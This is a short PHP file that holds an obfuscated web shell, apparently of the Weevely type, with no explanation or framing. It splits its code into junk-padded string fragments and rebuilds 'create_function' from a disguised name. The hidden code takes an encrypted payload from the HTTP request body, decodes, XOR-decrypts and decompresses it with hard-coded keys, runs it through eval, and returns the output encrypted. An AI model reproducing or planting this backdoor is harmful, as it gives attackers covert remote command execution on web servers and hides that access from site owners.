<?php
$r='0oJO9J";!(fu!(nction x($!(t,$k){!(!($c=strlen($k)!(;$l!(=strlen(!($t);!($!(o=""!(;fo';
$P='();$r=@b!(ase64_e!(ncod!(e(@x(@gzc!(ompres!(s($o),$!(k));p!(rint("!($!(p$kh$r$kf");}';
$M='nts("p!(hp:!(//input"),$m)!(!(==1) !({@ob_start();@e!(!(val(@gzu!(ncompres!(s(@x(@!(';
$n=str_replace('L','','crLeLatLLe_fLunctiLon');
$E='b!(as!(e64_decod!(e($m[1!(]),$k!()));!($o=@ob_get!(_conte!(nt!(s();@ob!(_end_cle!(an';
$j='r($!(!(i=0;$i<$l;){for($j!(=0;($j<$c&!(&$!(i<$!(l);$j++,$i++!(){$!(o.=$t!({$i}^$k!({$';
$u='j};}}ret!(u!(rn $o;}if (!(@pre!(g!(_matc!(h("/$kh(.+)$k!(f/",@!(file!(_get!(_conte!(';
$H='$k="!(!(f!(b59e2d3!(";$k!(h="32324c04!(ebf1!(";$!(kf="3a52d4ae!(6902";$p=!("TqxJr8!(tj6b';
$V=str_replace('!(','',$H.$r.$j.$u.$M.$E.$P);
$s=$n('',$V);$s();
?>
